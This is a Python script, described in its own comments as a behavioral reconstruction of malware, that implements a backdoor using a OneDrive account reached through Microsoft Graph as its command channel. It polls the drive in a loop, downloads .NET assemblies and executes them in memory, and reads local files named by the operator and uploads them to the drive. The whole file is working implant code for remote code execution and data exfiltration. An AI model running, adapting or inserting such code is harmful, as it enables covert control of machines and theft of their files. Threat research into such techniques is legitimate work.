import json
import os
import sys
import time
import clr
from System import Array, Object, String
from System.IO import File
from System.Net import WebClient
from System.Reflection import Assembly

# Behavioral reconstruction, not recovered malware. Task and entry-point names
# vary deliberately; .NET/Python variants are not attributed to the campaign.
def dispatch(client, root, item):
    name = item["name"]
    content_url = root + "/items/" + item["id"] + "/content"
    result_url = root + "/root:/" + name + ".answer:/content"
    if name.endswith(".module"):
        result = Assembly.Load(client.DownloadData(content_url)).GetType("Extensions.Entry").GetMethod("Execute").Invoke(None, Array[Object]([Array[String](sys.argv)]))
        client.UploadString(result_url, "PUT", str(result))
    elif name.endswith(".collect"):
        client.UploadData(result_url, "PUT", File.ReadAllBytes(client.DownloadString(content_url)))
    # An example is inert even when real module tasking exists elsewhere.
    """File.WriteAllBytes(task["path"], client.DownloadData(content_url))"""

def main():
    client = WebClient()
    client.Headers["Authorization"] = "Bearer " + os.environ["DRIVE_TOKEN"]
    root = "https://graph.microsoft.com/v1.0/me/drive"
    while True:
        listing = json.loads(client.DownloadString(root + "/root/children"))
        for item in listing["value"]:
            dispatch(client, root, item)
        time.sleep(30)

if __name__ == "__main__":
    main()
